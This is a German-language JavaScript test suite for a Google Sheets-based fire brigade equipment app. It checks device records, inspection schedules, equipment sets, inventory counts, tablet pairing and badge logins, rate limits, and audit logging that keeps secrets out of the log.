  const s = a.stand();
  const pa01 = a.geraet(s, 'PA01');
  const lager = a.ort(s, 'LOC-LAGER');
  const r = a.rufe(a.admin, 'geraete.speichern', { geraetetyp_id: pa01.geraetetyp_id, lagerplatz_id: lager.id, barcode: 'it-pa-0001' });
  pruefe(!r.ok && /Barcode trägt schon/.test(r.fehler), 'doppelter Barcode (ohne Rücksicht auf Groß/klein)', r);
  const r2 = a.rufe(a.admin, 'geraete.speichern', { geraetetyp_id: pa01.geraetetyp_id, lagerplatz_id: lager.id, bezeichnung: 'pa01' });
  pruefe(!r2.ok && /Bezeichnung/.test(r2.fehler), 'doppelte Bezeichnung', r2);
  const r3 = a.rufe(a.admin, 'geraete.speichern', { lagerplatz_id: lager.id });
  pruefe(!r3.ok && /Gerätetyp/.test(r3.fehler), 'Pflichtfeld Gerätetyp', r3);
  const r4 = a.rufe(a.admin, 'geraete.speichern', { geraetetyp_id: 'gibt-es-nicht', lagerplatz_id: lager.id });
  pruefe(!r4.ok && /existiert nicht/.test(r4.fehler), 'Verweis ins Leere', r4);
  const r5 = a.ok(a.admin, 'geraete.speichern', { geraetetyp_id: pa01.geraetetyp_id, lagerplatz_id: lager.id });
  const g = a.stand().geraete.find((x) => x.id === r5.ergebnis.id);
  pruefe(/^IT-[0-9A-F]{6}$/.test(g.barcode), 'Barcode automatisch mit Präfix', g.barcode);
  a.ok(a.admin, 'einstellungen.speichern', { werte: { barcode_praefix_geraete: 'FWM' } });
  const r6 = a.ok(a.admin, 'geraete.speichern', { geraetetyp_id: pa01.geraetetyp_id, lagerplatz_id: lager.id });
  pruefe(/^FWM-/.test(a.stand().geraete.find((x) => x.id === r6.ergebnis.id).barcode), 'neues Präfix wirkt');
  const r7 = a.rufe(a.admin, 'geraete.speichern', { geraetetyp_id: pa01.geraetetyp_id, lagerplatz_id: lager.id, status: 'kaputt' });
  pruefe(!r7.ok && /Unzulässiger Wert/.test(r7.fehler), 'unbekannter Status', r7);
  const r8 = a.rufe(a.admin, 'einstellungen.speichern', { werte: { vorwarnung_pruefung_tage: '9999' } });
  pruefe(!r8.ok, 'Vorwarnzeit begrenzt', r8);
  // Ein Barcode wie „00123“ bleibt Text.
  a.ok(a.admin, 'geraete.speichern', { geraetetyp_id: pa01.geraetetyp_id, lagerplatz_id: lager.id, barcode: '00123' });
  pruefe(a.stand().geraete.some((x) => x.barcode === '00123'), '„00123“ bleibt „00123“');
});

teil('Gerätetyp wechseln: Fälligkeiten folgen', () => {
  const a = bereit(true);
  const s = a.stand();
  const g = a.geraet(s, 'PG02'); // Feuerlöscher, Plan „Wartung“
  const saege = s.typen.find((t) => t.name === 'Motorkettensäge');
  a.ok(a.admin, 'geraete.speichern', { id: g.id, geraetetyp_id: saege.id });
  const st = a.stand().stand.filter((x) => x.geraet_id === g.id);
  const plaene = (id) => a.stand().plaene.find((p) => p.id === id);
  pruefe(st.some((x) => x.aktiv && plaene(x.pruefplan_id).geraetetyp_id === saege.id), 'Plan des neuen Typs aktiv');
  pruefe(st.filter((x) => plaene(x.pruefplan_id).geraetetyp_id !== saege.id).every((x) => !x.aktiv), 'Plan des alten Typs abgeschaltet, nicht gelöscht');
});

teil('Prüfplan: neues Intervall verschiebt Termine', () => {
  const a = bereit(true);
  const s = a.stand();
  const plan = s.plaene.find((p) => p.name === 'Wartung' && s.typen.find((t) => t.id === p.geraetetyp_id).name === 'Feuerlöscher');
  a.ok(a.admin, 'plaene.speichern', { id: plan.id, intervall_wert: 1, intervall_einheit: 'jahre' });
  const n = a.stand();
  n.stand.filter((x) => x.pruefplan_id === plan.id && x.zuletzt_geprueft).forEach((x) => {
    gleich(x.naechste_faellig, a.lauf(`datumPlus_('${x.zuletzt_geprueft}', 1, 'jahre')`), 'Termin nach neuem Intervall');
  });
  // Neuer Plan → jedes Gerät des Typs bekommt einen Termin.
  const helm = s.typen.find((t) => t.name === 'Feuerwehrhelm');
  a.ok(a.admin, 'plaene.speichern', { geraetetyp_id: helm.id, name: 'Sichtprüfung', intervall_wert: 1, intervall_einheit: 'jahre' });
  gleich(a.stand().kennzahlen.ohnePlan, 0, 'kein Gerät mehr ohne Plan');
  // Sonderplan nur für ein Gerät
  const ks = a.geraet(s, 'KS01');
  a.ok(a.admin, 'plaene.speichern', { geraet_id: ks.id, name: 'Kettenwechsel', intervall_wert: 3, intervall_einheit: 'monate' });
  const sp = a.stand().plaene.find((p) => p.name === 'Kettenwechsel');
  gleich(sp.geraetetyp_id, ks.geraetetyp_id, 'Sonderplan hängt am Typ des Geräts');
  gleich(a.stand().stand.filter((x) => x.pruefplan_id === sp.id).length, 1, 'nur für dieses eine Gerät');
});

teil('Prüfschritte ersetzen', () => {
  const a = bereit(true);
  const s = a.stand();
  const plan = s.plaene.find((p) => p.name === 'Druckprüfung' && s.typen.find((t) => t.id === p.geraetetyp_id).name === 'B-Druckschlauch');
  const alt = s.schritte.filter((x) => x.pruefplan_id === plan.id).sort((x, y) => x.position - y.position);
  a.ok(a.admin, 'schritte.speichern', { plan_id: plan.id, schritte: [{ titel: 'Neu zuerst', art: 'messwert', einheit: 'bar', pflicht: true }, { id: alt[1].id, titel: alt[1].titel, art: 'haken', pflicht: false }] });
  const neu = a.stand().schritte.filter((x) => x.pruefplan_id === plan.id).sort((x, y) => x.position - y.position);
  gleich(neu.map((x) => [x.titel, x.position, x.pflicht]), [['Neu zuerst', 1, true], [alt[1].titel, 2, false]], 'Reihenfolge, Pflicht, Entfernen');
});

teil('Import: ganz oder gar nicht', () => {
  const a = bereit(true);
  const vorher = a.stand().geraete.length;
  const r = a.rufe(a.admin, 'geraete.import', {
    zeilen: [
      { typ: 'Feuerlöscher', bezeichnung: 'PG03', lagerplatz: 'LOC-LAGER', status: 'Einsatzbereit' },
      { typ: 'Gibt es nicht', bezeichnung: 'X1', lagerplatz: 'LOC-LAGER' },
      { typ: 'Feuerlöscher', bezeichnung: 'PG04', lagerplatz: 'Nirgendwo' },
    ],
  });
  pruefe(!r.ok && /Zeile 3: Gerätetyp/.test(r.fehler) && /Zeile 4: Lagerplatz/.test(r.fehler), 'Fehler mit Zeilennummern', r);
  gleich(a.stand().geraete.length, vorher, 'nichts übernommen');
  const ok = a.ok(a.admin, 'geraete.import', {
    typenAnlegen: true,
    zeilen: [
      { typ: 'Feuerlöscher', bezeichnung: 'PG03', lagerplatz: 'LOC-LAGER', status: 'Zur Prüfung' },
      { typ: 'Wärmebildkamera', bezeichnung: 'WBK1', lagerplatz: 'LF 10', seriennummer: 'FL-1' },
    ],
  });
  gleich([ok.ergebnis.angelegt, ok.ergebnis.typenNeu], [2, 1], 'zwei Geräte, ein neuer Typ');
  const n = ok.stand;
  gleich(a.geraet(n, 'PG03').status, 'zur_pruefung', 'Status „Zur Prüfung“ erkannt');
  gleich(ortVon(n, 'WBK1'), 'LF 10', 'Lagerplatz über den Namen');
  pruefe(n.stand.some((x) => x.geraet_id === a.geraet(n, 'PG03').id), 'Fälligkeiten angelegt');
});

// ═══════════════════════════════ Sätze ═══════════════════════════════

teil('Gerätesätze', () => {
  const a = bereit(true);
  const s = a.stand();
  const satz3 = s.saetze.find((x) => x.name === 'AS-Satz 3');
  gleich(satz3.fehlt.map((f) => [s.typen.find((t) => t.id === f.geraetetyp_id).name, f.ist, f.soll]), [['Lungenautomat', 0, 1], ['Atemluftflasche', 0, 1]], 'was fehlt');
  const la04 = a.geraet(s, 'LA04');
  const r = a.ok(a.admin, 'saetze.hinzufuegen', { satz: satz3.id, geraete: [la04.id, a.geraet(s, 'FL06').id] });
  gleich(r.ergebnis, { neu: 2, gewechselt: 1 }, 'LA04 wechselt aus Satz 4');
  const n = r.stand;
  gleich(n.saetze.find((x) => x.name === 'AS-Satz 3').vollstaendigkeit, 'vollstaendig', 'Satz 3 jetzt vollständig');
  gleich(n.saetze.find((x) => x.name === 'AS-Satz 4').vollstaendigkeit, 'unvollstaendig', 'Satz 4 jetzt unvollständig');
  // Eine dritte Flasche: abweichend. Ein Helm: nicht in der Vorlage.
  const satz1 = n.saetze.find((x) => x.name === 'AS-Satz 1');
  a.ok(a.admin, 'saetze.hinzufuegen', { satz: satz1.id, geraete: [a.geraet(n, 'FL04').id] });
  gleich(a.stand().saetze.find((x) => x.id === satz1.id).vollstaendigkeit, 'abweichend', 'zu viele Flaschen');
  a.ok(a.admin, 'saetze.entfernen', { satz: satz1.id, geraete: [a.geraet(n, 'FL04').id] });
  a.ok(a.admin, 'saetze.hinzufuegen', { satz: satz1.id, geraete: [a.geraet(n, 'HELM03').id] });
  const s1 = a.stand().saetze.find((x) => x.id === satz1.id);
  gleich([s1.vollstaendigkeit, s1.fremd.length], ['abweichend', 1], 'fremder Typ');
  // Ausgemustert zählt nicht.
  a.ok(a.admin, 'betrieb.statusSetzen', { geraete: [a.geraet(n, 'PA01').id], status: 'ausgemustert' });
  gleich(a.stand().saetze.find((x) => x.id === satz1.id).vollstaendigkeit, 'unvollstaendig', 'ausgemusterter Pressluftatmer fehlt');
  // Satzart mit Sätzen lässt sich nicht löschen.
  const r2 = a.rufe(a.admin, 'satzarten.loeschen', { id: s.satzarten[0].id });
  pruefe(!r2.ok && /Sätze dieser Art/.test(r2.fehler), 'Satzart in Gebrauch', r2);
  // Satz auflösen: Geräte bleiben.
  a.ok(a.admin, 'saetze.loeschen', { id: satz1.id });
  const nach = a.stand();
  pruefe(!nach.saetze.some((x) => x.id === satz1.id) && a.geraet(nach, 'M01') && !a.geraet(nach, 'M01').satz_id, 'Satz weg, Geräte da');
});

// ═══════════════════════════════ Inventur ═══════════════════════════════

teil('Inventurgang', () => {
  const a = bereit(true);
  const carla = a.mitglied('carla', 'mitglied');
  const s = a.stand(carla);
  const lf = a.ort(s, 'LOC-LF10');
  const g1 = a.ok(carla, 'inventur.beginnen', { lagerplatz: lf.id }).ergebnis;
  const g2 = a.ok(carla, 'inventur.beginnen', { lagerplatz: lf.id }).ergebnis;
  gleich([g1.fortgesetzt, g2.fortgesetzt, g1.id === g2.id], [false, true, true], 'ein offener Gang wird fortgesetzt, nicht verdoppelt');
  // Auf dem LF 10 stehen 10 Geräte. Gefunden: 8 davon, dazu PA03 (fremd, aus dem Lager).
  const soll = s.geraete.filter((g) => g.lagerplatz_id === lf.id);
  gleich(soll.length, 10, 'Soll 10');
  const gefunden = soll.slice(0, 8).map((g) => g.id).concat([a.geraet(s, 'PA03').id, 'gibt-es-nicht']);
  const r = a.ok(carla, 'inventur.abschliessen', { id: g1.id, gefunden: gefunden, korrigieren: true, vermisst: true, bemerkung: 'Fach 3 klemmt' });
  gleich([r.ergebnis.gefunden.length, r.ergebnis.fehlt.length, r.ergebnis.fremd.length, r.ergebnis.vermisstGebucht], [8, 2, 1, 2], 'Befund');
  const n = r.stand;
  gleich(ortVon(n, 'PA03'), 'LF 10', 'fremdes Gerät geradegebucht');
  const vermisst = a.ort(n, 'LOC-VERMISST');
  gleich(r.ergebnis.fehlt.map((id) => n.geraete.find((g) => g.id === id).lagerplatz_id), [vermisst.id, vermisst.id], 'fehlende nach „Vermisst“');
  pruefe(a.ort(n, 'LOC-LF10').zuletzt_gezaehlt, 'zuletzt gezählt gesetzt');
  gleich(n.inventurenOffen.length, 0, 'kein offener Gang mehr');
  const buchungen = a.ok(a.admin, 'betrieb.buchungen', { lagerplatz: lf.id }).ergebnis.eintraege.filter((b) => b.grund_name === 'Inventur');
  gleich(buchungen.length, 3, 'drei Inventur-Buchungen (1 gerade, 2 vermisst)');
  pruefe(buchungen.every((b) => b.benutzer_name === 'carla'), 'auf den Namen der Zählerin');
  const nochmal = a.rufe(carla, 'inventur.abschliessen', { id: g1.id, gefunden: [] });
  pruefe(!nochmal.ok && /schon abgeschlossen/.test(nochmal.fehler), 'ein Nachweis wird nicht überschrieben', nochmal);
  const erg = a.ok(carla, 'inventur.ergebnis', { id: g1.id }).ergebnis;
  gleich(erg.zeilen.length, 11, 'elf Ergebniszeilen');
  pruefe(erg.zeilen.some((z) => z.ergebnis === 'fremd' && z.von_name === 'Lager Hauptwache'), 'fremd mit Herkunft');
  // Ohne Korrektur und ohne Vermisst bleibt alles stehen.
  const werk = a.ort(n, 'LOC-WERK');
  const g3 = a.ok(carla, 'inventur.beginnen', { lagerplatz: werk.id }).ergebnis;
  a.ok(carla, 'inventur.abschliessen', { id: g3.id, gefunden: [a.geraet(n, 'KS01').id], korrigieren: false, vermisst: false });
  gleich(ortVon(a.stand(), 'KS01'), 'Lager Hauptwache', 'ohne Korrektur kein Umbuchen');
});

// ═══════════════════════════════ Halle ═══════════════════════════════

teil('Hallengerät aus der Ferne koppeln', () => {
  const a = bereit(true);
  const k = a.ok(a.admin, 'hallengeraet.kopplung', { name: 'Tablet Wand', geteilt: true, abmelden_nach_min: 5, kuerzel_erlaubt: false }).ergebnis;
  pruefe(/^[A-Z2-9]{4}-[A-Z2-9]{4}$/.test(k.code), 'Kopplungscode zum Abtippen', k.code);
  gleich(a.rufe('carla@ff.example', 'hallengeraet.kopplung', {}).code, 'kein_zugang', 'nur für Mitglieder …');
  const ben = a.mitglied('ben', 'geraetewart');
  gleich(a.rufe(ben, 'hallengeraet.kopplung', {}).code, 'verboten', '… und nur für Administratoren');
  pruefe(![...a.eigenschaften.keys()].some((x) => x.includes(k.code.replace('-', ''))), 'Code nur als Abdruck gespeichert');
  // Das Tablet: mit einem Konto, das kein Mitglied ist.
  const geheimnis = 'T'.repeat(40);
  const falsch = a.rufe(a.hallenkonto, 'halle.koppeln', { code: 'AAAA-BBBB', geheimnis: geheimnis });
  pruefe(!falsch.ok && /gilt nicht/.test(falsch.fehler), 'falscher Code', falsch);
  const r = a.rufe(a.hallenkonto, 'halle.koppeln', { code: k.code.toLowerCase(), geheimnis: geheimnis });
  pruefe(r.ok && r.ergebnis.name === 'Tablet Wand' && r.ergebnis.kuerzel_erlaubt === false, 'gekoppelt (Kleinschreibung, Bindestrich egal)', r);
  const g = a.stand().hallengeraete.find((x) => x.name === 'Tablet Wand');
  gleich([g.geteilt, g.abmelden_nach_min, g.kuerzel_erlaubt, g.angelegt_von], [true, 5, false, 'Anna Admin'], 'Einstellungen aus der Kopplung');
  pruefe(a.protokoll().some((p) => p.objekt_art === 'hallengeraete' && p.aktion === 'anlegen' && p.benutzer_name === 'Anna Admin'), 'im Protokoll auf den Administrator');
  const nochmal = a.rufe(a.hallenkonto, 'halle.koppeln', { code: k.code, geheimnis: 'U'.repeat(40) });
  pruefe(!nochmal.ok, 'Code gilt nur einmal', nochmal);
  // Abgelaufen
  const alt = a.ok(a.admin, 'hallengeraet.kopplung', { name: 'Alt', geteilt: false }).ergebnis;
  const schl = [...a.eigenschaften.keys()].find((x) => x.indexOf('kopplung:') === 0);
  const wert = JSON.parse(a.eigenschaften.get(schl));
  wert.bis = Date.now() - 1;
  a.eigenschaften.set(schl, JSON.stringify(wert));
  pruefe(!a.rufe(a.hallenkonto, 'halle.koppeln', { code: alt.code, geheimnis: 'V'.repeat(40) }).ok, 'abgelaufener Code gilt nicht');
  // Bremse für alle Geräte zusammen
  for (let i = 0; i < 10; i++) a.rufe(a.hallenkonto, 'halle.koppeln', { code: 'ZZZZ-ZZZ' + i, geheimnis: geheimnis });
  const neu = a.ok(a.admin, 'hallengeraet.kopplung', { name: 'Neu', geteilt: false }).ergebnis;
  const gebremst = a.rufe(a.hallenkonto, 'halle.koppeln', { code: neu.code, geheimnis: 'W'.repeat(40) });
  pruefe(!gebremst.ok && /Zu viele/.test(gebremst.fehler), 'nach zehn Fehlversuchen Ruhe – auch für den richtigen Code', gebremst);
  // Mit dem gekoppelten Gerät: nur Ausweis, kein Kürzel.
  gleich(a.rufe(null, 'halle.anmelden', { geraet: geheimnis, code: 'AA' }).fehler, 'Ausweis nicht erkannt.', 'Kürzel an diesem Gerät abgeschaltet');
});

teil('Hallengerät: Ausweis oder Kürzel', () => {
  const a = bereit(true);
  const carlaAdresse = a.mitglied('carla', 'mitglied');
  const carla = a.stand(carlaAdresse).ich;
  const geheimnis = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789ABCDEFGH';
  a.ok(a.admin, 'hallengeraet.anmelden', { name: 'Tablet Halle', geteilt: true, abmelden_nach_min: 3, geheimnis: geheimnis });
  pruefe(!a.blatt('Hallengeräte').getDataRange().getValues().flat().includes(geheimnis), 'Gerätegeheimnis nur als Abdruck');
  const geraet = a.stand().hallengeraete[0];
  pruefe(geraet.kuerzel_erlaubt === true, 'Kürzel ab Werk erlaubt');
  const ausweis = a.ok(a.admin, 'ausweis.ausgeben', { mitglied: carla.id }).ergebnis;
  pruefe(/^FW[A-Z2-9]{32}$/.test(ausweis.code), 'Ausweiscode: FW + 160 Bit', ausweis.code);
  pruefe(!a.blatt('Ausweise').getDataRange().getValues().flat().includes(ausweis.code), 'Ausweiscode nur als Abdruck');

  // Ohne angemeldetes Gerät helfen weder Ausweis noch Kürzel.
  gleich(a.rufe(null, 'halle.anmelden', { geraet: 'falsch', code: ausweis.code }).code, 'geraet_unbekannt', 'fremdes Gerät: deutliche Meldung');
  gleich(a.rufe(null, 'halle.anmelden', { geraet: 'falsch', code: 'CARLA' }).code, 'geraet_unbekannt', 'Kürzel ohne Gerät: nichts');
  gleich(a.rufe(null, 'halle.anmelden', { geraet: geheimnis, code: 'NIEMAND' }).fehler, 'Ausweis oder Kürzel nicht erkannt.', 'Unbekanntes: stumpfe Meldung');

  // Ausweis
  const r = a.rufe(null, 'halle.anmelden', { geraet: geheimnis, code: ausweis.code.toLowerCase() });
  pruefe(r.ok && r.stand && r.stand.ich.art === 'halle' && r.stand.ich.mit === 'ausweis' && r.stand.ich.geraet.geteilt, 'Anmeldung mit Ausweis (Kleinschreibung egal)', r.fehler);
  const mitAusweis = r.ergebnis.token;
  // Kürzel
  const k = a.rufe(null, 'halle.anmelden', { geraet: geheimnis, code: ' carla ' });
  pruefe(k.ok && k.stand.ich.name === 'carla' && k.stand.ich.mit === 'kuerzel', 'Anmeldung mit Kürzel', k.fehler);
  const mitKuerzel = k.ergebnis.token;
  const anmeldungen = a.protokoll().filter((p) => p.aktion === 'anmeldung');
  gleich(anmeldungen.map((p) => JSON.parse(p.details).mit), ['Ausweis', 'Kürzel'], 'Protokoll sagt, womit');
  pruefe(anmeldungen.every((p) => p.benutzer_name === 'carla'), 'auf den Namen der Angemeldeten');

  // In der Halle: buchen ja, verwalten nein – auch nicht als Administrator.
  const s = r.stand;
  const umg = a.rufe(mitKuerzel, 'betrieb.umlagern', { geraete: [a.geraet(s, 'C04').id], nach: a.ort(s, 'LOC-MTW').id, grund: a.grund(s, 'Übung').id });
  pruefe(umg.ok, 'Halle mit Kürzel: umlagern', umg.fehler);
  const buchung = a.ok(a.admin, 'betrieb.buchungen', { geraet: a.geraet(s, 'C04').id }).ergebnis.eintraege[0];
  gleich(buchung.benutzer_name, 'carla', 'Buchung auf Carlas Namen');
  gleich(a.rufe(mitKuerzel, 'geraete.akte', { id: a.geraet(s, 'C04').id }).code, 'verboten', 'Halle: keine Akte');
  const annaKuerzel = a.ok(null, 'halle.anmelden', { geraet: geheimnis, code: 'aa' }).ergebnis.token;
  gleich(a.rufe(annaKuerzel, 'mitglieder.speichern', { name: 'x', email: 'x@ff.example', rolle: 'admin' }).code, 'verboten', 'Admin am Hallengerät: keine Verwaltung');
  gleich(a.rufe(annaKuerzel, 'ausweis.ausgeben', { mitglied: carla.id }).code, 'verboten', 'Admin am Hallengerät: keine Ausweise');
  // Das Google-Konto des Tablets ist kein Mitglied – ohne Token kommt es nicht hinein.
  gleich(a.rufe(a.hallenkonto, 'daten.laden').code, 'kein_zugang', 'das Konto des Tablets allein: kein Zugang');

  // Kürzel am Gerät abschalten: Kürzel-Sitzungen enden, Ausweis-Sitzungen nicht.
  a.ok(a.admin, 'hallengeraet.aendern', { id: geraet.id, kuerzel_erlaubt: false });
  gleich(a.rufe(mitKuerzel, 'daten.laden').code, 'abgemeldet', 'Kürzel-Sitzung endet');
  pruefe(a.rufe(mitAusweis, 'daten.laden').ok, 'Ausweis-Sitzung bleibt');
  gleich(a.rufe(null, 'halle.anmelden', { geraet: geheimnis, code: 'CARLA' }).fehler, 'Ausweis nicht erkannt.', 'Kürzel abgewiesen, Meldung ohne Kürzel');
  a.ok(a.admin, 'hallengeraet.aendern', { id: geraet.id, kuerzel_erlaubt: true });

  // Neuer Ausweis: Der alte gilt nicht mehr, die Sitzung endet.
  a.ok(a.admin, 'ausweis.ausgeben', { mitglied: carla.id });
  gleich(a.rufe(mitAusweis, 'daten.laden').code, 'abgemeldet', 'neuer Ausweis beendet die alte Sitzung');
  gleich(a.rufe(null, 'halle.anmelden', { geraet: geheimnis, code: ausweis.code }).fehler, 'Ausweis oder Kürzel nicht erkannt.', 'alter Ausweis wertlos');
  // Gesperrtes Mitglied: auch das Kürzel hilft nicht.
  a.ok(a.admin, 'mitglieder.speichern', { id: carla.id, aktiv: false });
  gleich(a.rufe(null, 'halle.anmelden', { geraet: geheimnis, code: 'CARLA' }).fehler, 'Ausweis oder Kürzel nicht erkannt.', 'gesperrt: Kürzel wertlos');
  // Gerät gesperrt: Sitzung endet.
  a.ok(a.admin, 'hallengeraet.aendern', { id: geraet.id, gesperrt: true });
  gleich(a.rufe(annaKuerzel, 'daten.laden').code, 'abgemeldet', 'gesperrtes Gerät beendet die Sitzung');
  gleich(a.rufe(null, 'halle.anmelden', { geraet: geheimnis, code: 'AA' }).code, 'geraet_unbekannt', 'gesperrtes Gerät wird nicht erkannt');
  // Bremse am Gerät
  a.ok(a.admin, 'hallengeraet.aendern', { id: geraet.id, gesperrt: false });
  for (let i = 0; i < 10; i++) a.rufe(null, 'halle.anmelden', { geraet: geheimnis, code: 'RATE' + i });
  const gebremst = a.rufe(null, 'halle.anmelden', { geraet: geheimnis, code: 'AA' });
  pruefe(!gebremst.ok && /Zu viele Fehlversuche an diesem Gerät/.test(gebremst.fehler), 'Bremse zählt am Gerät – auch das richtige Kürzel wartet', gebremst);
});

// ═══════════════════════════════ Protokoll ═══════════════════════════════

teil('Protokoll: Unterschiede statt Abzüge, Geheimes geschwärzt', () => {
  const a = bereit(true);
  const s = a.stand();
  const pa01 = a.geraet(s, 'PA01');
  a.ok(a.admin, 'geraete.speichern', { id: pa01.id, bemerkung: 'Neue Bemerkung' });
  const e = a.protokoll().filter((p) => p.objekt_id === pa01.id && p.aktion === 'aendern').pop();
  const d = JSON.parse(e.details);
  gleich(Object.keys(d.aenderungen), ['bemerkung'], 'nur das geänderte Feld');
  gleich(e.benutzer_name, 'Anna Admin', 'wer');
  a.ok(a.admin, 'mitglieder.speichern', { name: 'Dora', email: 'dora@ff.example', kuerzel: 'DO', rolle: 'mitglied' });
  const doraId = a.stand().mitglieder.find((x) => x.name === 'Dora').id;
  const ausweis = a.ok(a.admin, 'ausweis.ausgeben', { mitglied: doraId }).ergebnis;
  const zeile = a.protokoll().filter((p) => p.objekt_art === 'ausweise' && p.aktion === 'anlegen').pop();
  pruefe(zeile && zeile.objekt_text === 'Ausweis Dora', 'Ausgabe des Ausweises im Protokoll', zeile);
  const abdruck = a.blatt('Ausweise').getDataRange().getValues().slice(-1)[0].join(' ');
  pruefe(!JSON.stringify(a.protokoll()).includes(ausweis.code) && !a.protokoll().some((p) => abdruck.split(' ').some((t) => t.length === 64 && p.details.includes(t))),
    'weder Code noch Abdruck im Protokoll');
  a.ok(a.admin, 'hallengeraet.anmelden', { name: 'X', geteilt: false, geheimnis: 'Q'.repeat(40) });
  pruefe(!a.protokoll().some((p) => p.details.includes(a.lauf("sha256Hex_('" + 'Q'.repeat(40) + "')"))), 'Abdruck des Gerätegeheimnisses nicht im Protokoll');
  const lesen = a.ok(a.admin, 'protokoll.lesen', { suche: 'pa01' }).ergebnis;
  pruefe(lesen.eintraege.length > 0 && lesen.eintraege.every((x) => /PA01/i.test(JSON.stringify(x))), 'Suche', lesen.gesamt);
  const alle = a.ok(a.admin, 'protokoll.lesen', {}).ergebnis;
  pruefe(alle.eintraege[0].objekt_art === 'hallengeraete', 'neueste zuerst', alle.eintraege[0]);
  const geloescht = a.rufe(a.admin, 'geraete.loeschen', { id: a.ok(a.admin, 'geraete.speichern', { geraetetyp_id: pa01.geraetetyp_id, lagerplatz_id: pa01.lagerplatz_id, bezeichnung: 'WEG1' }).ergebnis.id });
  pruefe(geloescht.ok, 'Gerät gelöscht');
  const weg = a.protokoll().filter((p) => p.aktion === 'loeschen' && p.objekt_art === 'geraete').pop();
  pruefe(/WEG1/.test(weg.objekt_text), 'Löschung trägt den Namen', weg);
});

// ═══════════════════════════════ Speicher ═══════════════════════════════

teil('Zwischenspeicher: geschrieben ist gelesen, von Hand geändert auch', () => {
  const a = bereit(true);
  const s1 = a.stand();
  const pa01 = a.geraet(s1, 'PA01');
  a.ok(a.admin, 'geraete.speichern', { id: pa01.id, bemerkung: 'über die App' });
  gleich(a.geraet(a.stand(), 'PA01').bemerkung, 'über die App', 'eigene Änderung sofort sichtbar');
  // Von Hand im Blatt – ohne onEdit sähe man es nicht, mit schon.
  const sh = a.blatt('Geräte');
  const werte = sh.getDataRange().getValues();
  const spalte = werte[0].indexOf('bemerkung');
  const zeile = werte.findIndex((z) => z[0] === pa01.id);
  sh.getRange(zeile + 1, spalte + 1).setValues([['von Hand']]);
  gleich(a.geraet(a.stand(), 'PA01').bemerkung, 'über die App', 'ohne Auslöser: noch der Zwischenspeicher');
  a.ctx.onEdit();
  gleich(a.geraet(a.stand(), 'PA01').bemerkung, 'von Hand', 'nach onEdit: frisch aus dem Blatt');
  const rev = a.rufe(a.admin, 'daten.revision').ergebnis;
  gleich(rev, a.rufe(a.admin, 'daten.revision').ergebnis, 'Fingerabdruck stabil');
  a.ok(a.admin, 'geraete.speichern', { id: pa01.id, bemerkung: 'x' });
  pruefe(rev !== a.rufe(a.admin, 'daten.revision').ergebnis, 'Fingerabdruck ändert sich nach dem Schreiben');
});

teil('Speicher: Spalten am Namen, fremde Spalten bleiben, Löschen von unten', () => {
  const a = bereit(true);
  const sh = a.blatt('Lagerplätze');
  // Eine eigene Spalte der Wehr daneben – mit Inhalt.
  const breite = sh.getLastColumn();
  sh.getRange(1, breite + 1).setNumberFormat('@').setValues([['Notiz der Wehr']]);
  sh.getRange(2, breite + 1).setNumberFormat('@').setValues([['bitte lassen']]);
  a.ctx.onEdit();
  const s = a.stand();
  const ort = s.lagerplaetze.find((l) => l.id === sh.getRange(2, 1).getValues()[0][0]);
  a.ok(a.admin, 'lagerplaetze.speichern', { id: ort.id, name: ort.name + ' (umbenannt)' });
  gleich(sh.getRange(2, breite + 1).getValues()[0][0], 'bitte lassen', 'fremde Spalte unberührt');
  // Mehrere Zeilen löschen, auseinanderliegend.
  const neu = ['A', 'B', 'C', 'D'].map((n) => a.ok(a.admin, 'lagerplaetze.speichern', { name: 'Platz ' + n, typ: 'lager' }).ergebnis.id);
  a.ok(a.admin, 'lagerplaetze.loeschen', { id: neu[1] });
  a.ok(a.admin, 'lagerplaetze.loeschen', { id: neu[3] });
  const namen = a.stand().lagerplaetze.map((l) => l.name);
  pruefe(namen.includes('Platz A') && namen.includes('Platz C') && !namen.includes('Platz B') && !namen.includes('Platz D'), 'die richtigen gelöscht', namen);
  // Die Ids im Blatt stimmen mit den Namen überein (keine verschobenen Zeilen).
  const w = sh.getDataRange().getValues();
  const st = a.stand();
  w.slice(1).forEach((z) => {
    const l = st.lagerplaetze.find((x) => x.id === z[0]);
    pruefe(l && l.name === z[1], 'Zeile ' + z[0] + ' konsistent');
  });
});

teil('Einrichten ist wiederholbar und ergänzt fehlende Spalten', () => {
  const a = bereit(true);
  const sh = a.blatt('Gerätetypen');
  const kopf = () => sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
  // Eine Spalte fehlt (jemand hat sie gelöscht): Spalten am Namen, also wird angehängt.
  sh.getRange(1, kopf().indexOf('modell') + 1).setValues([['']]);
  a.lauf('Speicher_.vergessen()');
  const bericht = a.lauf('einrichten_()');
  pruefe(/Ergänzte Spalten: Gerätetypen: modell/.test(bericht), 'Einrichten ergänzt sie', bericht);
  pruefe(a.rufe(a.admin, 'daten.laden').ok, 'danach geht es wieder');
  gleich(a.lauf('einrichten_()'), 'Alle Blätter sind vorhanden.', 'zweiter Lauf: nichts zu tun');
  gleich(a.ausloeser.length, 1, 'Auslöser genau einmal');
});

teil('Eine neue Fassung bringt Spalten mit – die App ergänzt sie selbst', () => {
  const a = bereit(true);
  // Wie vor 0.3: Qualifikationsarten ohne „aus_einsatz“, und der Zwischenspeicher kennt
  // das Blatt noch so. Nach `clasp push` soll die Web-App nicht erst an „Einrichten“ scheitern.
  const sh = a.blatt('Qualifikationsarten');
  const spalte = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0].indexOf('aus_einsatz');
  sh.daten = sh.daten.map((z) => z.filter((w, i) => i !== spalte));
  sh.formate = sh.formate.map((z) => z.filter((w, i) => i !== spalte));
  pruefe(a.stand().qualiarten.length === 6, 'Stand aus dem Zwischenspeicher (der noch die alte Spalte kennt)');
  a.ctx.onEdit();
  const r = a.rufe(a.admin, 'daten.laden');
  pruefe(r.ok && r.ergebnis.qualiarten.every((q) => q.aus_einsatz === false), 'lädt – die neue Spalte ist leer, also „nein“', r.fehler);
  const neu = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
  pruefe(neu[neu.length - 1] === 'aus_einsatz', 'Spalte hinten angefügt', neu);
  const art = r.ergebnis.qualiarten.find((q) => q.name.indexOf('Einsatz oder Übung') === 0);
  pruefe(a.rufe(a.admin, 'qualiarten.speichern', { id: art.id, aus_einsatz: true }).ok, 'und lässt sich schreiben');
  gleich(a.stand().qualiarten.find((q) => q.id === art.id).aus_einsatz, true, 'gelesen, wie geschrieben');
});

